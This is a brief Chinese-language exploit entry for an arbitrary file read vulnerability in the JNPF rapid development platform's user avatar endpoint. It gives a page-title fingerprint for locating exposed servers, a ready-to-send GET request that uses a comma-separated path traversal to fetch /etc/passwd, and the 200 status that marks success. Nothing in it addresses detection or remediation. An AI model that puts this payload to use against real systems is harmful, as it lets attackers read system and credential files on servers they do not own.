# JNPF快速开发平台userAvatar存在任意文件文件读取漏洞

JNPF ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="JNPF快速开发平台"`
- **请求**：`GET /api/file/Image/userAvatar/aa,..,..,..,..,..,..,..,..,..,etc,passwd HTTP/1.1`
- **响应特征**：200